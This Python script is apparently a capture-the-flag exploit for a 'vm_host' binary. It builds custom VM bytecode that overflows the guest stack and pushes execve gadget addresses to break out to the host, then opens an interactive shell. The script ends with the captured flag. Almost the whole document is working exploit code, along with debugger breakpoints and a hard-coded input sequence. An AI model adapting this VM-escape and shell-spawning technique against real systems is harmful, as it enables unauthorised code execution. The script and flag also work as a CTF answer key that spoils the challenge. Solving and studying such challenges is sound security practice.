#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./vm_host', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set follow-fork-mode parent

define stage1
    break *0x4037CB
end

define stage2
    delete breakpoints
    break *0x403A09
end

define stage3
    delete breakpoints
    break *0x403D4E
    break *0x4027ED
    break *0x40280D
end

stage1

c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process(["game.bin"])
    elif args.GDB:
        p = gdb.debug([exe.path, "game.bin"], gdbscript=gdbscript)
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
        with open("game.bin", "rb") as f:
            raw = f.read()
        data = raw.hex().encode()
        p.sendlineafter(b"Hex bytecode: ", data)
    return p


class VMBuilder:
    MAGIC = bytes.fromhex("CAFE8386")

    def __init__(self):
        self.code = []

    def mov(self, reg, imm32):
        self.code.append(bytes([0x01, reg & 7]) + p32(imm32))
        return self

    def load(self, reg, addr):
        self.code.append(bytes([0x02, reg & 7]) + p16(addr))
        return self

    def store(self, addr, reg):
        self.code.append(bytes([0x03]) + p16(addr) + bytes([reg & 7]))
        return self

    def push(self, reg):
        self.code.append(bytes([0x0D, reg & 7]))
        return self

    def pop(self, reg):
        self.code.append(bytes([0x0E, reg & 7]))
        return self

    def sysc(self, id_):
        self.code.append(bytes([0x0F, id_ & 0xFF]))
        return self


    def build(self):
        return b''.join(self.code)

    @staticmethod
    def make_image_code(code_bytes, xor_key=0x35, data=b''):
        enc = code_bytes if xor_key is None else bytes([b ^ (xor_key & 0xFF) for b in code_bytes])
        return flat([VMBuilder.MAGIC, p16(len(enc)), p16(len(data)), enc, data])

    @staticmethod
    def make_image_data(code_in_data):
        return flat([VMBuilder.MAGIC, p16(0), p16(len(code_in_data)), code_in_data])

def inp(a, b):
    slna(b'> ', a)
    slna(b'>> ', b)

p = start()
PITS = 0x40a1e8

vm = VMBuilder()

# Stage 1
for i in range(11):
    vm.sysc(0)

# Stage 2
for i in range(55):
    vm.push(0)

vm.mov(0, 0x501)
vm.sysc(2)

# Stage 3
vm.mov(0, 0x40339400) # execve
vm.push(0)

vm.mov(0, 0)
vm.push(0)

vm.mov(0, 0x40b71000)
vm.push(0)

vm.mov(0, 0)
vm.push(0)

vm.mov(0, 0x4023aa00)
vm.push(0)

data = vm.build()

with open('game.bin', 'wb') as f:
    f.write(VMBuilder.make_image_data(data))

inp(5, 1)
inp(4, 1)
inp(4, 1)
inp(3, 1)
inp(2, 1)
inp(5, 1)
inp(1, 1)
inp(2, 1)
inp(1, 0)
inp(2, 0)
inp(3, 0)

interactive(flag=False)
# DDC{Escape_Gu3st_T0_H05t}
